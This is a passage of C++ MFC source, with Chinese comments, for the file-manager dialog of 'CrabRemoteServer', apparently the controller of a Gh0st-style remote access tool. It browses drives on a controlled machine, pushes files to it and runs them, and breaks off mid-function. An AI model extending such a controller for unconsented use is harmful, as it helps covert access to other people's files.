// FileManagerDlg.cpp: 实现文件
//

#include "pch.h"
#include "CrabRemoteServer.h"
#include "FileManagerDlg.h"
#include "afxdialogex.h"
ULONG CFileManagerDlg::m_TransferMode = TRANSFER_MODE_NORMAL;
// CFileManagerDlg 对话框
static UINT __Indicators[] =
{

	ID_SEPARATOR,
	ID_SEPARATOR,
	IDR_STATUSBAR_FILE_MANAGER_PROGRESS,
};
IMPLEMENT_DYNAMIC(CFileManagerDlg, CDialogEx)

CFileManagerDlg::CFileManagerDlg(CWnd* pParent, CIocpServer*
	IocpServer, CONTEXT_OBJECT* ContextObject)
	:CDialogEx(IDD_FILE_MANAGER_DIALOG, pParent),
	//m_TransferMode(TRANSFER_MODE_NORMAL), // 使用初始化列表初始化 m_TransferMode
	m_IocpServer(IocpServer),
	m_ContextObject(ContextObject),
	m_IsDragging(FALSE),
	m_IsStop(FALSE),
	m_TransferFileLength(0),
	m_Counter(0)
{
	m_IconHwnd = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));
	m_IocpServer = IocpServer;
	m_ContextObject = ContextObject;
	m_CursorHwnd = (HCURSOR)AfxGetApp()->LoadStandardCursor(IDC_CROSS);
	SetCursor(m_CursorHwnd);
	//m_TransferMode = TRANSFER_MODE_NORMAL;

	memset(m_ClientData, 0, sizeof(m_ClientData));  //初始化内存
	memset(m_ServerData, 0, sizeof(m_ServerData));  //初始化内存
	//int x = ContextObject->m_ReceivedBufferDataDecompressed.GetArrayLength();
	memcpy(m_ClientData, ContextObject->m_ReceivedBufferDataDecompressed.GetArray(1),
		ContextObject->m_ReceivedBufferDataDecompressed.GetArrayLength() - 1);
	//m_TransferMode = TRANSFER_MODE_NORMAL;
	//文件类型
	SHFILEINFO	v1;   //
	//卷图标
	HIMAGELIST ImageListHwnd;   //SDK
							   //加载服务端系统图标列表
	ImageListHwnd = (HIMAGELIST)SHGetFileInfo
	(
		NULL,
		0,
		&v1,
		sizeof(SHFILEINFO),
		SHGFI_LARGEICON | SHGFI_SYSICONINDEX
	);
	m_LargeImageList = CImageList::FromHandle(ImageListHwnd);   //CimageList*
																  //加载系统图标列表
	ImageListHwnd = (HIMAGELIST)SHGetFileInfo
	(
		NULL,
		0,
		&v1,
		sizeof(SHFILEINFO),
		SHGFI_SMALLICON | SHGFI_SYSICONINDEX
	);
	m_SmallImageList = CImageList::FromHandle(ImageListHwnd);



	m_IsDragging = FALSE;
	m_IsStop = FALSE;
}

CFileManagerDlg::~CFileManagerDlg()
{
}

void CFileManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_SERVER_FILE_LIST, m_ServerFileList);
	DDX_Control(pDX, IDC_CLIENT_FILE_LIST, m_ClientFileList);
	DDX_Control(pDX, IDC_SERVER_FILE_COMBO, m_ServerFileCombo);
	DDX_Control(pDX, IDC_CLIENT_FILE_COMBO, m_ClientFileCombo);
	DDX_Control(pDX, IDC_SERVER_POSITION_STATIC, m_ServerPosition);
	DDX_Control(pDX, IDC_CLIENT_POSITION_STATIC, m_ClientPosition);
}

void CFileManagerDlg::OnReceiveComplete(void)
{
	//判断回传消息
	if (m_ContextObject == NULL)
	{
		return;
	}
	switch (m_ContextObject->m_ReceivedBufferDataDecompressed.GetArray(0)[0])
	{
	case CLIENT_FILE_MANAGER_FILE_LIST_REPLY:
	{
		FixedClientFileList(m_ContextObject->m_ReceivedBufferDataDecompressed.GetArray(),
			m_ContextObject->m_ReceivedBufferDataDecompressed.GetArrayLength() - 1);
		break;
	}
	case CLIENT_FILE_MANAGER_TRANSFER_MODE_REQUIRE:
	{
		//在客户端中发现有重名文件
		SendTransferMode();


		break;
	}
	case CLIENT_FILE_MANAGER_FILE_DATA_CONTINUE:
	{
		SendServerFileDataToClient();
		break;
	}
	}
}

int CFileManagerDlg::GetIconIndex(LPCTSTR VolumeName, DWORD FileAttributes)
{
	SHFILEINFO	v1;
	if (FileAttributes == INVALID_FILE_ATTRIBUTES)
		FileAttributes = FILE_ATTRIBUTE_NORMAL;
	else
		FileAttributes |= FILE_ATTRIBUTE_NORMAL;

	SHGetFileInfo
	(
		VolumeName,
		FileAttributes,
		&v1,
		sizeof(SHFILEINFO),
		SHGFI_SYSICONINDEX | SHGFI_USEFILEATTRIBUTES
	);

	return v1.iIcon;
}

void CFileManagerDlg::FixedServerVolumeList()
{
	char	VolumeData[0x500] = { 0 };
	CHAR* Travel = NULL;
	m_ServerFileList.DeleteAllItems();

	while (m_ServerFileList.DeleteColumn(0) != 0);   //判断一下上面的清空

	//初始化列表信息
	m_ServerFileList.InsertColumn(0, _T("名称"), LVCFMT_CENTER, 200);
	m_ServerFileList.InsertColumn(1, _T("类型"), LVCFMT_CENTER, 80);
	m_ServerFileList.InsertColumn(2, _T("文件系统"), LVCFMT_CENTER, 60);
	m_ServerFileList.InsertColumn(3, _T("总大小"), LVCFMT_CENTER, 100);
	m_ServerFileList.InsertColumn(4, _T("可用空间"), LVCFMT_CENTER, 100);

	m_ServerFileList.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	//获得磁盘资源
	GetLogicalDriveStrings(sizeof(VolumeData), (LPSTR)VolumeData);  //c:\.d:\.
	Travel = VolumeData;

	CHAR	FileSystemType[MAX_PATH];
	unsigned __int64	HardDiskAmount = 0;
	unsigned __int64	HardDiskFreeSpace = 0;
	unsigned long		HardDiskAmountMB = 0;
	unsigned long		HardDiskFreeSpaceMB = 0;


	for (int i = 0; *Travel != '\0'; i++, Travel += lstrlen(Travel) + 1)
	{
		// 得到磁盘相关信息
		memset(FileSystemType, 0, sizeof(FileSystemType));
		// 得到文件系统信息及大小
		GetVolumeInformation(Travel, NULL, 0, NULL, NULL, NULL, FileSystemType, MAX_PATH);

		ULONG	FileSystemTypeLength = lstrlen(FileSystemType) + 1;

		if (GetDiskFreeSpaceEx(Travel, (PULARGE_INTEGER)&HardDiskFreeSpace, (PULARGE_INTEGER)&HardDiskAmount, NULL))
		{
			HardDiskAmountMB = HardDiskAmount / 1024 / 1024;
			HardDiskFreeSpaceMB = HardDiskFreeSpace / 1024 / 1024;
		}
		else
		{
			HardDiskAmountMB = 0;
			HardDiskFreeSpaceMB = 0;
		}


		int	Item = m_ServerFileList.InsertItem(i, Travel,
			GetIconIndex(Travel, GetFileAttributes(Travel)));    //获得系统的图标		

		//c d e f
		m_ServerFileList.SetItemData(Item, 1); //这里将代表目录的隐藏数据插入到该项

		m_ServerFileList.SetItemText(Item, 2, FileSystemType);//文件系统


		SHFILEINFO	v1;
		SHGetFileInfo(Travel, FILE_ATTRIBUTE_NORMAL, &v1, sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
		m_ServerFileList.SetItemText(Item, 1, v1.szTypeName);   //磁盘类型


		CString	v2;
		v2.Format(_T("%10.1f GB"), (float)HardDiskAmountMB / 1024);
		m_ServerFileList.SetItemText(Item, 3, v2);
		v2.Format(_T("%10.1f GB"), (float)HardDiskFreeSpaceMB / 1024);
		m_ServerFileList.SetItemText(Item, 4, v2);
	}
}

void CFileManagerDlg::FixedClientVolumeList()
{
	m_ClientFileList.DeleteAllItems();
	m_ClientFileList.InsertColumn(0, _T("名称"), LVCFMT_CENTER, 200);
	m_ClientFileList.InsertColumn(1, _T("类型"), LVCFMT_CENTER, 80);
	m_ClientFileList.InsertColumn(2, _T("文件系统"), LVCFMT_CENTER, 60);
	m_ClientFileList.InsertColumn(3, _T("总大小"), LVCFMT_CENTER, 100);
	m_ClientFileList.InsertColumn(4, _T("可用空间"), LVCFMT_CENTER, 100);

	m_ClientFileList.SetExtendedStyle(LVS_EX_FULLROWSELECT);


	char* Travel = NULL;
	Travel = (char*)m_ClientData;   //已经去掉了消息头的1个字节了


	int i = 0;
	ULONG v1 = 0;
	for (i = 0; Travel[i] != '\0';)
	{
		//由驱动器名判断图标的索引
		if (Travel[i] == 'A' || Travel[i] == 'B')
		{
			v1 = 6;
		}
		else
		{

			switch (Travel[i + 1])   //这里是判断驱动类型 查看被控端
			{
			case DRIVE_REMOVABLE:
				v1 = 2 + 5;
				break;
			case DRIVE_FIXED:
				v1 = 3 + 5;
				break;
			case DRIVE_REMOTE:
				v1 = 4 + 5;
				break;
			case DRIVE_CDROM:
				v1 = 9;	//Win7为10
				break;
			default:
				v1 = 0;
				break;
			}
		}
		//02E3F844  43 03 04 58 02 00 73 D7 00 00 B1 BE B5 D8 B4 C5 C5 CC 00 4E 54 46 53 00 44  C..X..s...本地磁盘.NTFS.D
		//2E3F85E  03 04 20 03 00 FC 5B 00 00 B1 BE B5 D8 B4 C5 C5 CC 00 4E 54 46 53 00

		CString	v2;
		//格式化盘符
		v2.Format(_T("%c:\\"), Travel[i]);
		int	Item = m_ClientFileList.InsertItem(i, v2, v1);
		m_ClientFileList.SetItemData(Item, 1);
		//该数据不显示是隐藏在当前项中  1代表目录 0代表是文件



		unsigned long		HardDiskAmountMB = 0; //大小
		unsigned long		HardDiskFreeMB = 0;   //剩余空间
		memcpy(&HardDiskAmountMB, Travel + i + 2, 4);
		memcpy(&HardDiskFreeMB, Travel + i + 6, 4);

		v2.Format(_T("%10.1f GB"), (float)HardDiskAmountMB / 1024);
		m_ClientFileList.SetItemText(Item, 3, v2);
		v2.Format(_T("%10.1f GB"), (float)HardDiskFreeMB / 1024);
		m_ClientFileList.SetItemText(Item, 4, v2);

		i += 10;
		CString  v7;
		v7 = Travel + i;
		m_ClientFileList.SetItemText(Item, 1, v7);    //磁盘类型
		i += strlen(Travel + i) + 1;
		CString  FileSystemType;
		FileSystemType = Travel + i;
		m_ClientFileList.SetItemText(Item, 2, FileSystemType);   //文件系统
		i += strlen(Travel + i) + 1;

	}
}

VOID CFileManagerDlg::FixedServerFileList(CString DirectoryFullPath)
{
	if (DirectoryFullPath.GetLength() == 0)
	{
		//取出ControlList中的项
		int	Item = m_ServerFileList.GetSelectionMark();

		//如果有选中
		if (Item != -1)
		{
			//获得该项中的隐藏数据
			if (m_ServerFileList.GetItemData(Item) == 1)
			{
				//是目录
				DirectoryFullPath = m_ServerFileList.GetItemText(Item, 0);
			}
		}
		// 从组合框里得到路径
		else
		{

			//m_CCombo_File_Server.GetWindowText(m_File_Server_Path);
		}
	}

	if (DirectoryFullPath == _T(".."))   //返回上一层
	{
		//返回上一层目录
		m_ServerFullPath = GetParentDirectory(m_ServerFullPath);

	}
	//刷新当前用
	else if (DirectoryFullPath != _T("."))   //在系统中的每个目录中都会存在一个.或..目录
	{

		//C:\           1
		//.
		//..
		//HelloWorld    1


		m_ServerFullPath += DirectoryFullPath;      //记录完整路径
		if (m_ServerFullPath.Right(1) != "\\")
		{

			m_ServerFullPath += "\\";
		}
	}

	if (m_ServerFullPath.GetLength() == 0)
	{
		FixedServerVolumeList();   //刷新卷信息
		return;
	}


	//将最终的文件路径放入到控件中
	m_ServerFileCombo.InsertString(0, m_ServerFullPath);
	m_ServerFileCombo.SetCurSel(0);


	//删除ControlList上的项
	m_ServerFileList.DeleteAllItems();
	while (m_ServerFileList.DeleteColumn(0) != 0);

	m_ServerFileList.InsertColumn(0, _T("名称"), LVCFMT_CENTER, 200);
	m_ServerFileList.InsertColumn(1, _T("类型"), LVCFMT_CENTER, 80);
	m_ServerFileList.InsertColumn(2, _T("文件系统"), LVCFMT_CENTER, 60);
	m_ServerFileList.InsertColumn(3, _T("总大小"), LVCFMT_CENTER, 100);
	m_ServerFileList.InsertColumn(4, _T("可用空间"), LVCFMT_CENTER, 100);

	m_ServerFileList.SetExtendedStyle(LVS_EX_FULLROWSELECT);



	int			v10 = 0;

	//自己在ControlList的控件上写入一个..目录(一旦双击就返回上一层)
	m_ServerFileList.SetItemData(m_ServerFileList.InsertItem(v10++, "..",
		GetIconIndex(NULL, FILE_ATTRIBUTE_DIRECTORY)), 1);


	//文件扫描

	//循环两次代表两种类型(目录与文件)
	for (int i = 0; i < 2; i++)   //1  1   1   0  1  0  1
	{
		CFileFind	FileFind;    //文件搜索类
		BOOL		IsLoop;
		IsLoop = FileFind.FindFile(m_ServerFullPath + _T("*.*"));   //D:\*.*   代表一切
		while (IsLoop)
		{
			IsLoop = FileFind.FindNextFile();
			if (FileFind.IsDots())   //真正的文件系统上扫描
			{
				continue;
			}
			BOOL IsInsert = !FileFind.IsDirectory() == i;   //是文件还是文件夹

			if (!IsInsert)
			{
				//不是文件也不是文件夹
				continue;
			}
			int Item = m_ServerFileList.InsertItem(v10++, FileFind.GetFileName(),
				GetIconIndex(FileFind.GetFileName(), GetFileAttributes(FileFind.GetFilePath())));
			//如果是目录设置隐藏数据为1
			m_ServerFileList.SetItemData(Item, FileFind.IsDirectory());
			SHFILEINFO	v1;
			SHGetFileInfo(FileFind.GetFileName(), FILE_ATTRIBUTE_NORMAL, &v1, sizeof(SHFILEINFO),
				SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);

			if (FileFind.IsDirectory())
			{
				m_ServerFileList.SetItemText(Item, 2, _T("文件夹"));
			}
			else
			{
				m_ServerFileList.SetItemText(Item, 2, v1.szTypeName);
			}
			CString v2;
			v2.Format(_T("%10d KB"), FileFind.GetLength() / 1024 + (FileFind.GetLength() % 1024 ? 1 : 0));
			m_ServerFileList.SetItemText(Item, 1, v2);
			CTime Time;
			FileFind.GetLastWriteTime(Time);
			m_ServerFileList.SetItemText(Item, 3, Time.Format(_T("%Y-%m-%d %H:%M")));
		}
	}
	return VOID();
}

VOID CFileManagerDlg::FixedClientFileList(BYTE* BufferData, ULONG BufferLength)
{
	// 重建标题
	m_ClientFileList.DeleteAllItems();
	while (m_ClientFileList.DeleteColumn(0) != 0);

	m_ClientFileList.InsertColumn(0, _T("名称"), LVCFMT_CENTER, 200);
	m_ClientFileList.InsertColumn(1, _T("类型"), LVCFMT_CENTER, 80);
	m_ClientFileList.InsertColumn(2, _T("文件系统"), LVCFMT_CENTER, 60);
	m_ClientFileList.InsertColumn(3, _T("总大小"), LVCFMT_CENTER, 100);
	m_ClientFileList.InsertColumn(4, _T("可用空间"), LVCFMT_CENTER, 100);

	m_ClientFileList.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	int	v10 = 0;
	m_ClientFileList.SetItemData(m_ClientFileList.InsertItem(v10++, "..",
		GetIconIndex(NULL, FILE_ATTRIBUTE_DIRECTORY)), 1);
	if (BufferLength != 0)
	{
		//遍历发送来的数据显示到列表中
		for (int i = 0; i < 2; i++)
		{
			//跳过Token   	//[Flag 1 HelloWorld\0大小 大小 时间 时间 0 1.txt\0 大小 大小 时间 时间]
			char* Travel = (char*)(BufferData + 1);
			//[1 HelloWorld\0大小 大小 时间 时间 0 1.txt\0 大小 大小 时间 时间]
			for (char* v1 = Travel; Travel - v1 < BufferLength - 1;)
			{
				char* FileName = NULL;
				DWORD	FileSizeHigh = 0; // 文件高字节大小
				DWORD	FileSizeLow = 0;  // 文件低字节大小
				int		Item = 0;
				bool	IsInsert = false;
				FILETIME FileTime;

				int	v3 = *Travel ? FILE_ATTRIBUTE_DIRECTORY : FILE_ATTRIBUTE_NORMAL;
				//i为0时列目录i为1时列文件
				IsInsert = !(v3 == FILE_ATTRIBUTE_DIRECTORY) == i;

				////[HelloWorld\0大小 大小 时间 时间 0 1.txt\0 大小 大小 时间 时间]
				FileName = ++Travel;

				if (IsInsert)
				{
					Item = m_ClientFileList.InsertItem(v10++, FileName, GetIconIndex(FileName, v3));
					m_ClientFileList.SetItemData(Item, v3 == FILE_ATTRIBUTE_DIRECTORY);   //隐藏属性
					SHFILEINFO	v1;
					SHGetFileInfo(FileName, FILE_ATTRIBUTE_NORMAL | v3, &v1, sizeof(SHFILEINFO),
						SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
					m_ClientFileList.SetItemText(Item, 2, v1.szTypeName);
				}
				//得到文件大小
				Travel += strlen(FileName) + 1;
				if (IsInsert)
				{
					memcpy(&FileSizeHigh, Travel, 4);
					memcpy(&FileSizeLow, Travel + 4, 4);
					CString v7;
					v7.Format(_T("%10d KB"), (FileSizeHigh * (MAXDWORD + 1)) / 1024 + FileSizeLow / 1024 + (FileSizeLow % 1024 ? 1 : 0));
					m_ClientFileList.SetItemText(Item, 1, v7);
					memcpy(&FileTime, Travel + 8, sizeof(FILETIME));
					CTime	Time(FileTime);
					m_ClientFileList.SetItemText(Item, 3, Time.Format(_T("%Y-%m-%d %H:%M")));
				}
				Travel += 16;
			}
		}
	}

	//恢复窗口
	m_ClientFileList.EnableWindow(TRUE);
}

CString CFileManagerDlg::GetParentDirectory(CString FileFullPath)
{
	CString	v1 = FileFullPath;
	int Index = v1.ReverseFind('\\');
	if (Index == -1)
	{
		return v1;
	}
	CString v2 = v1.Left(Index);
	Index = v2.ReverseFind('\\');
	if (Index == -1)
	{
		v1 = "";
		return v1;
	}
	v1 = v2.Left(Index);

	if (v1.Right(1) != "\\")
	{
		v1 += "\\";
	}
	return v1;
}

VOID CFileManagerDlg::GetClientFileList(CString DirectoryFullPath)
{
	if (DirectoryFullPath.GetLength() == 0)   //磁盘卷
	{
		int	Item = m_ClientFileList.GetSelectionMark();


		if (Item != -1)
		{
			//有选中项
			if (m_ClientFileList.GetItemData(Item) == 1)
			{
				//选中项是个目录
				DirectoryFullPath = m_ClientFileList.GetItemText(Item, 0);
			}
		}
		//从组合框里得到路径
		else
		{
			//m_Remote_Directory_ComboBox.GetWindowText(m_File_Client_Path);
		}
	}

	if (DirectoryFullPath == "..")
	{
		m_ClientFullPath = GetParentDirectory(m_ClientFullPath);
	}

	else if (DirectoryFullPath != ".")
	{
		m_ClientFullPath += DirectoryFullPath;
		if (m_ClientFullPath.Right(1) != "\\")
		{
			m_ClientFullPath += "\\";
		}
	}


	if (m_ClientFullPath.GetLength() == 0)
	{
		//到达根目录实际就是要刷新卷
		FixedClientVolumeList();
		return;
	}


	ULONG	BufferLength = m_ClientFullPath.GetLength() + 2;
	BYTE* BufferData = (BYTE*)new BYTE[BufferLength];


	BufferData[0] = CLIENT_FILE_MANAGER_FILE_LIST_REQUIRE;
	memcpy(BufferData + 1, m_ClientFullPath.GetBuffer(0), BufferLength - 1);
	m_IocpServer->OnPrepareSending(m_ContextObject, BufferData, BufferLength);
	delete[] BufferData;
	BufferData = NULL;

	//得到返回数据前禁窗口
	m_ClientFileList.EnableWindow(FALSE);   //不能瞎点
	 //初始化进度条
	m_ProgressCtrl->SetPos(0);

}


BEGIN_MESSAGE_MAP(CFileManagerDlg, CDialogEx)
	ON_NOTIFY(NM_DBLCLK, IDC_SERVER_FILE_LIST, &CFileManagerDlg::OnNMDblclkServerFileList)
	ON_NOTIFY(NM_DBLCLK, IDC_CLIENT_FILE_LIST, &CFileManagerDlg::OnNMDblclkClientFileList)
	ON_WM_LBUTTONUP()
	ON_WM_MOUSEMOVE()
	ON_NOTIFY(LVN_BEGINDRAG, IDC_SERVER_FILE_LIST, &CFileManagerDlg::OnLvnBegindragServerFileList)
	ON_COMMAND(IDT_CLIENT_FILE_PREVIOUS, &CFileManagerDlg::OnClientFilePrevious)
	ON_COMMAND(IDT_CLIENT_FILE_STOP, &CFileManagerDlg::OnClientFileStop)
	ON_COMMAND(IDT_SERVER_FILE_PREVIOUS, &CFileManagerDlg::OnServerFilePrevious)
	ON_COMMAND(IDT_SERVER_FILE_DELETE, &CFileManagerDlg::OnServerFileDelete)
	ON_COMMAND(IDT_SERVER_NEW_FOLDER, &CFileManagerDlg::OnServerNewFolder)
	ON_COMMAND(IDT_SERVER_FILE_STOP, &CFileManagerDlg::OnServerFileStop)
	
	ON_NOTIFY(LVN_ENDLABELEDIT, IDC_SERVER_FILE_LIST, &CFileManagerDlg::OnLvnEndlabeleditServerFileList)
	ON_NOTIFY(LVN_ENDLABELEDIT, IDC_CLIENT_FILE_LIST, &CFileManagerDlg::OnLvnEndlabeleditClientFileList)
	ON_COMMAND(ID_SERVER_FILE_VIEW_BIG, &CFileManagerDlg::OnServerFileViewBig)
	ON_COMMAND(ID_SERVER_FILE_VIEW_SMALL, &CFileManagerDlg::OnServerFileViewSmall)
	ON_COMMAND(ID_SERVER_FILE_VIEW_LIST, &CFileManagerDlg::OnServerFileViewList)
	ON_COMMAND(ID_SERVER_FILE_VIEW_DETAIL, &CFileManagerDlg::OnServerFileViewDetail)
	ON_NOTIFY(NM_RCLICK, IDC_SERVER_FILE_LIST, &CFileManagerDlg::OnNMRClickServerFileList)
	ON_COMMAND(ID_SERVER_FILE_RUN, &CFileManagerDlg::OnServerFileRun)
END_MESSAGE_MAP()


// CFileManagerDlg 消息处理程序


BOOL CFileManagerDlg::OnInitDialog()
{

	// TODO:  在此添加额外的初始化
	CDialogEx::OnInitDialog();

	// TODO:  在此添加额外的初始化
	SetIcon(m_IconHwnd, FALSE);
	//获得客户端IP
	CString v1;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int ClientAddressLength = sizeof(ClientAddress);
	BOOL IsOk = getpeername(m_ContextObject->clientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength); //得到连接的ip 
	v1.Format(_T("\\\\%s - 远程文件管理"), IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "");

	SetWindowText(v1);


	//界面设置
	if (!m_ServerFileToolBar.Create(this, WS_CHILD |
		WS_VISIBLE | CBRS_ALIGN_ANY | CBRS_TOOLTIPS | CBRS_FLYBY, IDR_SERVER_FILE_TOOLBAR)
		|| !m_ServerFileToolBar.LoadToolBar(IDR_SERVER_FILE_TOOLBAR))
	{

		return -1;
	}
	m_ServerFileToolBar.LoadTrueColorToolBar
	(
		24,    //加载真彩工具条 
		IDB_FILE_MANAGER_BITMAP,
		IDB_FILE_MANAGER_BITMAP,
		IDB_FILE_MANAGER_BITMAP    //没有用
	);
	m_ServerFileToolBar.AddDropDownButton(this, IDT_SERVER_FILE_VIEW,
		IDR_SERVER_FILE_VIEW_MENU);

	m_ServerFileToolBar.SetButtonText(0, _T("返回"));     //在位图的下面添加文件
	m_ServerFileToolBar.SetButtonText(1, _T("查看"));
	m_ServerFileToolBar.SetButtonText(2, _T("删除"));
	m_ServerFileToolBar.SetButtonText(3, _T("新建"));
	m_ServerFileToolBar.SetButtonText(4, _T("查找"));
	m_ServerFileToolBar.SetButtonText(5, _T("停止"));
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);  //显示


	//在list上显示的数据会带有图标
	m_ServerFileList.SetImageList(m_LargeImageList, LVSIL_NORMAL);
	m_ServerFileList.SetImageList(m_SmallImageList, LVSIL_SMALL);


	if (!m_ClientFileToolBar.Create(this, WS_CHILD |
		WS_VISIBLE | CBRS_ALIGN_ANY | CBRS_TOOLTIPS | CBRS_FLYBY, IDR_CLIENT_FILE_TOOLBAR)
		|| !m_ClientFileToolBar.LoadToolBar(IDR_CLIENT_FILE_TOOLBAR))
	{

		return -1;
	}
	m_ClientFileToolBar.LoadTrueColorToolBar
	(
		24,    //加载真彩工具条 
		IDB_FILE_MANAGER_BITMAP,
		IDB_FILE_MANAGER_BITMAP,
		IDB_FILE_MANAGER_BITMAP    //没有用
	);
	m_ClientFileToolBar.AddDropDownButton(this, IDT_CLIENT_FILE_VIEW,
		IDT_CLIENT_FILE_VIEW);

	m_ClientFileToolBar.SetButtonText(0, _T("返回"));     //在位图的下面添加文件
	m_ClientFileToolBar.SetButtonText(1, _T("查看"));
	m_ClientFileToolBar.SetButtonText(2, _T("删除"));
	m_ClientFileToolBar.SetButtonText(3, _T("新建"));
	m_ClientFileToolBar.SetButtonText(4, _T("查找"));
	m_ClientFileToolBar.SetButtonText(5, _T("停止"));
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);  //显示

	m_ClientFileList.SetImageList(m_LargeImageList, LVSIL_NORMAL);
	m_ClientFileList.SetImageList(m_SmallImageList, LVSIL_SMALL);




	//获得整个窗口大小
	RECT	ClientRect;
	GetClientRect(&ClientRect);


	CRect v3;
	v3.top = ClientRect.bottom - 25;
	v3.left = 0;
	v3.right = ClientRect.right;
	v3.bottom = ClientRect.bottom;
	if (!m_StatusBar.Create(this) ||
		!m_StatusBar.SetIndicators(__Indicators,
			sizeof(__Indicators) / sizeof(UINT)))
	{
		return -1;
	}
	m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_StatusBar.SetPaneInfo(1, m_StatusBar.GetItemID(1), SBPS_NORMAL, 120);
	m_StatusBar.SetPaneInfo(2, m_StatusBar.GetItemID(2), SBPS_NORMAL, 50);
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示状态栏

	m_StatusBar.MoveWindow(v3);

	m_StatusBar.GetItemRect(1, &ClientRect);

	ClientRect.bottom -= 1;

	//进度条
	m_ProgressCtrl = new CProgressCtrl;
	m_ProgressCtrl->Create(PBS_SMOOTH | WS_VISIBLE, ClientRect, &m_StatusBar, 1);
	m_ProgressCtrl->SetRange(0, 100);           //设置进度条范围
	m_ProgressCtrl->SetPos(0);

	//Server真彩
	RECT	RectServer;
	m_ServerPosition.GetWindowRect(&RectServer);
	m_ServerPosition.ShowWindow(SW_HIDE);
	//显示工具栏
	m_ServerFileToolBar.MoveWindow(&RectServer);

	//Client真彩
	RECT	RectClient;
	m_ClientPosition.GetWindowRect(&RectClient);
	m_ClientPosition.ShowWindow(SW_HIDE);
	//显示工具栏
	m_ClientFileToolBar.MoveWindow(&RectClient);

	FixedServerVolumeList();   //获得当前计算机上的文件信息显示
	FixedClientVolumeList();   //将客户端上的数据显示出来
	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}


void CFileManagerDlg::OnNMDblclkServerFileList(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	if (m_ServerFileList.GetSelectedCount() == 0 ||
		m_ServerFileList.GetItemData(m_ServerFileList.GetSelectionMark()) != 1)   //获取隐藏数据判断1是文件夹 0 文件
	{
		//点击的不是目录
		return;
	}

	FixedServerFileList();
	*pResult = 0;
}


void CFileManagerDlg::OnNMDblclkClientFileList(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	if (m_ClientFileList.GetSelectedCount() == 0 ||
		m_ClientFileList.GetItemData(m_ClientFileList.GetSelectionMark()) != 1)
	{
		return;
	}
	GetClientFileList();  //向客户端发消息
	*pResult = 0;
}


void CFileManagerDlg::OnLButtonUp(UINT nFlags, CPoint point)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if (m_IsDragging)
	{
		ReleaseCapture();  //释放鼠标的捕获

		m_IsDragging = FALSE;

		CPoint Point(point);    //获得当前鼠标的位置相对于整个屏幕的
		ClientToScreen(&Point); //转换成相对于当前用户的窗口的位置

		CWnd* v1 = WindowFromPoint(Point);   //获得当前的鼠标下方有无控件


		if (v1->IsKindOf(RUNTIME_CLASS(CListCtrl))) //如果是一个ListControl
		{
			m_Drop = (CListCtrl*)v1;       //保存当前的窗口句柄

			DropFileOnList(); //处理传输
		}
	}
	CDialogEx::OnLButtonUp(nFlags, point);
}


void CFileManagerDlg::OnMouseMove(UINT nFlags, CPoint point)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if (m_IsDragging)    //我们只对拖拽感兴趣
	{
		CPoint Point(point);	 //获得鼠标位置
		ClientToScreen(&Point);  //转成相对于自己屏幕的

	//根据鼠标获得窗口句柄
		CWnd* v1 = WindowFromPoint(Point);   //值所在位置 有没有控件

		if (v1->IsKindOf(RUNTIME_CLASS(CListCtrl)))   //属于我们的窗口范围内
		{
			SetCursor(m_CursorHwnd);

			return;
		}
		else
		{
			SetCursor(LoadCursor(NULL, IDC_NO));   //超出窗口换鼠标样式
		}
	}
	CDialogEx::OnMouseMove(nFlags, point);
}


void CFileManagerDlg::OnLvnBegindragServerFileList(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	if (m_ServerFullPath.IsEmpty() || m_ClientFullPath.IsEmpty())
	{
		return;
	}
	if (m_ServerFileList.GetSelectedCount() > 1)
	{
		//如果选择多项
		m_CursorHwnd = AfxGetApp()->LoadCursor(IDC_MULTI_CURSOR);
	}
	else
	{
		//如果选择单项
		m_CursorHwnd = AfxGetApp()->LoadCursor(IDC_SINGLE_CURSOR);
	}


	m_IsDragging = TRUE;
	m_Drag = &m_ServerFileList;
	m_Drop = &m_ClientFileList;

	SetCapture();
	*pResult = 0;
}

VOID CFileManagerDlg::CopyServerFileToClient()
{
	//定义一哥模板
	m_ServerFileToClientJob.RemoveAll();
	POSITION Position = m_ServerFileList.GetFirstSelectedItemPosition();
	while (Position)
	{
		int Item = m_ServerFileList.GetNextSelectedItem(Position);
		CString	FileFullPath = NULL;


		FileFullPath = m_ServerFullPath + m_ServerFileList.GetItemText(Item, 0);   //C:\HelloWorld\\


		//如果是目录
		if (m_ServerFileList.GetItemData(Item))   //获得选项的隐藏数据
		{
			FileFullPath += '\\';   /*  C:\HelloWorld\\  */
			FixedServerFileToClient(FileFullPath.GetBuffer(0));
		}
		else
		{

			//打开文件判断是否合法
			HANDLE FileHanlde = CreateFile(FileFullPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
